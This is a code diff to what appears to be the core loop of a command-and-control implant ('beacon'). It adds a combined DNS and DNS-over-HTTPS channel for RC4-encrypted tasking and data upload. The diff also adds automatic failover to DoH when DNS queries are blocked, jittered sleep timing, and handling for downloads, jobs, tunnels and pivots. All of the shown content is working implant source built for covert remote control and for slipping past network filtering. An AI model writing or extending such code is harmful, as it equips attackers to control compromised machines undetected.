@@ -521,7 +521,6 @@ void AgentMain()
 	packerOut->Pack32(0);
 
 	do {
-		DohDebugLog("[DoH] Loop: start iteration");
 		if (packerOut->datasize() > 4) {
 			packerOut->Set32(0, packerOut->datasize());
 			BYTE* plainBuf = packerOut->data();
@@ -619,6 +618,233 @@ void AgentMain()
 	g_Connector->RecvClear();
 
 	g_Connector->CloseConnector();
+	AgentClear(g_Agent->config->exit_method);
+}
+
+#elif defined(BEACON_DNS_DOH)
+
+#include "ConnectorDNS.h"
+#include "ConnectorDoH.h"
+
+ConnectorDNS* g_DnsConnector;
+ConnectorDoH* g_DohConnector;
+
+// Helper macros to dispatch operations to the currently selected transport.
+#define TX_SEND(data, size)           (useDns ? g_DnsConnector->SendData((data), (size))      : g_DohConnector->SendData((data), (size)))
+#define TX_SIZE()                     (useDns ? g_DnsConnector->RecvSize()                   : g_DohConnector->RecvSize())
+#define TX_DATA()                     (useDns ? g_DnsConnector->RecvData()                   : g_DohConnector->RecvData())
+#define TX_CLEAR()                    (useDns ? g_DnsConnector->RecvClear()                  : g_DohConnector->RecvClear())
+#define TX_IS_BUSY()                  (useDns ? g_DnsConnector->IsBusy()                     : g_DohConnector->IsBusy())
+#define TX_LAST_UP()                  (useDns ? g_DnsConnector->GetLastUpTotal()             : g_DohConnector->GetLastUpTotal())
+#define TX_LAST_DOWN()                (useDns ? g_DnsConnector->GetLastDownTotal()           : g_DohConnector->GetLastDownTotal())
+#define TX_RESET_TOTALS()             (useDns ? g_DnsConnector->ResetTrafficTotals()         : g_DohConnector->ResetTrafficTotals())
+#define TX_LAST_OK()                  (useDns ? g_DnsConnector->WasLastQueryOk()             : g_DohConnector->WasLastQueryOk())
+
+void AgentMain()
+{
+	if (!ApiLoad())
+		return;
+
+	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
+	*g_Agent = Agent();
+
+	// Allocate both DNS and DoH connectors.
+	g_DnsConnector = (ConnectorDNS*)MemAllocLocal(sizeof(ConnectorDNS));
+	if (!g_DnsConnector)
+		return;
+	*g_DnsConnector = ConnectorDNS();
+
+	g_DohConnector = (ConnectorDoH*)MemAllocLocal(sizeof(ConnectorDoH));
+	if (!g_DohConnector)
+		return;
+	*g_DohConnector = ConnectorDoH();
+
+	ULONG beatSize = 0;
+	BYTE* beat = g_Agent->BuildBeat(&beatSize);
+
+	// Combined profile carries both DNS and DoH settings.
+	// For now we initialize both; transport selection is done per-loop via useDns.
+	if (!g_DnsConnector->SetConfig(g_Agent->config->profile.dns, beat, beatSize))
+		return;
+	if (!g_DohConnector->SetConfig(g_Agent->config->profile.doh, beat, beatSize))
+		return;
+
+	// Decide initial transport: default DNS, "doh" forces DoH, "auto" starts on DNS
+	// and may later fail over to DoH once conditions are met.
+	BOOL useDns = TRUE;
+	BOOL autoMode = FALSE;
+	ULONG dnsFailCount = 0;
+	BOOL autoSwitchedToDoh = FALSE;
+
+	BYTE* mode = g_Agent->config->profile.mode;
+	if (mode) {
+		if (lstrcmpiA((CHAR*)mode, "doh") == 0) {
+			useDns = FALSE;
+		} else if (lstrcmpiA((CHAR*)mode, "dns") == 0) {
+			useDns = TRUE;
+		} else if (lstrcmpiA((CHAR*)mode, "auto") == 0) {
+			useDns = TRUE;
+			autoMode = TRUE;
+		}
+	}
+
+	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
+	*packerOut = Packer();
+	packerOut->Pack32(0);
+
+	do {
+		if (packerOut->datasize() > 4) {
+			packerOut->Set32(0, packerOut->datasize());
+			BYTE* plainBuf = packerOut->data();
+			ULONG plainLen = packerOut->datasize();
+
+			BYTE* sessionBuf = NULL;
+			ULONG sessionLen = 0;
+
+			BYTE* payload    = plainBuf;
+			ULONG payloadLen = plainLen;
+			BYTE  flags      = 0;
+
+			const ULONG minCompressSize = 2048;
+			if (payloadLen > minCompressSize) {
+				BYTE* compBuf = NULL;
+				ULONG compLen = 0;
+				if (DeflateCompress(payload, payloadLen, &compBuf, &compLen) && compBuf && compLen > 0 && compLen < payloadLen) {
+					payload    = compBuf;
+					payloadLen = compLen;
+					flags      = 1;
+				}
+			}
+
+			sessionLen = 1 + 4 + payloadLen;
+			sessionBuf = (BYTE*)MemAllocLocal(sessionLen);
+			if (sessionBuf) {
+				sessionBuf[0] = flags;
+				sessionBuf[1] = (BYTE)(plainLen & 0xFF);
+				sessionBuf[2] = (BYTE)((plainLen >> 8) & 0xFF);
+				sessionBuf[3] = (BYTE)((plainLen >> 16) & 0xFF);
+				sessionBuf[4] = (BYTE)((plainLen >> 24) & 0xFF);
+				memcpy(sessionBuf + 5, payload, payloadLen);
+			}
+
+			if (!sessionBuf) {
+				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
+				TX_SEND(plainBuf, plainLen);
+			} else {
+				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
+				TX_SEND(sessionBuf, sessionLen);
+				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
+			}
+
+			if (flags & 0x1 && payload && payload != plainBuf) {
+				MemFreeLocal((LPVOID*)&payload, payloadLen);
+			}
+
+			packerOut->Clear(TRUE);
+			packerOut->Pack32(0);
+		} else {
+			TX_SEND(NULL, 0);
+		}
+
+		if (TX_SIZE() && TX_DATA()) {
+			DecryptRC4(TX_DATA(), TX_SIZE(), g_Agent->SessionKey, 16);
+			g_Agent->commander->ProcessCommandTasks(TX_DATA(), TX_SIZE(), packerOut);
+		}
+		TX_CLEAR();
+
+		{
+			BYTE* dnsResolvers = g_Agent->config->profile.dns.resolvers;
+			if (dnsResolvers && dnsResolvers != (BYTE*)g_DnsConnector->GetResolvers()) {
+				g_DnsConnector->UpdateResolvers(dnsResolvers);
+			}
+			BYTE* dohUrls = g_Agent->config->profile.doh.urls;
+			if (dohUrls && dohUrls != (BYTE*)g_DohConnector->GetUrls()) {
+				g_DohConnector->UpdateUrls(dohUrls);
+			}
+		}
+
+		// Apply any runtime "transport mode" changes coming from COMMAND_TRANSPORT.
+		// This keeps useDns/autoMode in sync with config->profile.mode, while still
+		// allowing the auto-failover state machine to operate when mode=auto.
+		BYTE* dynMode = g_Agent->config->profile.mode;
+		if (dynMode) {
+			if (lstrcmpiA((CHAR*)dynMode, "doh") == 0) {
+				useDns = FALSE;
+				autoMode = FALSE;
+				dnsFailCount = 0;
+				autoSwitchedToDoh = FALSE;
+			} else if (lstrcmpiA((CHAR*)dynMode, "dns") == 0) {
+				useDns = TRUE;
+				autoMode = FALSE;
+				dnsFailCount = 0;
+				autoSwitchedToDoh = FALSE;
+			} else if (lstrcmpiA((CHAR*)dynMode, "auto") == 0) {
+				// Start from DNS when entering auto mode.
+				useDns = TRUE;
+				autoMode = TRUE;
+				dnsFailCount = 0;
+				autoSwitchedToDoh = FALSE;
+			}
+		}
+
+		// Auto-failover (DNS -> DoH) when in "auto" mode:
+		// Treat connector-level lastQueryOk as our signal. If DNS repeatedly
+		// fails queries (network/WAF), switch once to DoH and stay there.
+		if (autoMode && !autoSwitchedToDoh && useDns) {
+			if (TX_LAST_OK()) {
+				// Any successful DNS round resets the failure counter.
+				dnsFailCount = 0;
+			} else {
+				++dnsFailCount;
+				const ULONG kDnsFailThreshold = 3;
+				if (dnsFailCount >= kDnsFailThreshold) {
+					useDns = FALSE;              // switch to DoH
+					autoSwitchedToDoh = TRUE;    // only switch once
+					dnsFailCount = 0;
+				}
+			}
+		}
+
+		if (g_Agent->IsActive() && packerOut->datasize() < 8) {
+			ULONG baseSleep = g_Agent->config->sleep_delay;
+			ULONG jitter    = g_Agent->config->jitter_delay;
+
+			BOOL burst = FALSE;
+			if (TX_IS_BUSY() || (TX_LAST_UP() >= (1 * 1024)) || (TX_LAST_DOWN() >= (1 * 1024))) {
+				burst = TRUE;
+			}
+
+			if (burst) {
+				ULONG burstSleep = 50;
+				if (baseSleep < burstSleep)
+					burstSleep = baseSleep;
+				WaitMask(g_Agent->GetWorkingSleep(), burstSleep, 0);
+				TX_RESET_TOTALS();
+			} else {
+				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
+			}
+		}
+
+		g_Agent->downloader->ProcessDownloader(packerOut);
+		g_Agent->jober->ProcessJobs(packerOut);
+		g_Agent->proxyfire->ProcessTunnels(packerOut);
+		g_Agent->pivotter->ProcessPivots(packerOut);
+
+	} while (g_Agent->IsActive());
+
+	g_Agent->commander->Exit(packerOut);
+	packerOut->Set32(0, packerOut->datasize());
+	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
+	TX_SEND(packerOut->data(), packerOut->datasize());
+	packerOut->Clear(TRUE);
+	TX_CLEAR();
+
+	// Close both connectors explicitly.
+	if (g_DnsConnector)
+		g_DnsConnector->CloseConnector();
+	if (g_DohConnector)
+		g_DohConnector->CloseConnector();
+
 	AgentClear(g_Agent->config->exit_method);
 }
 
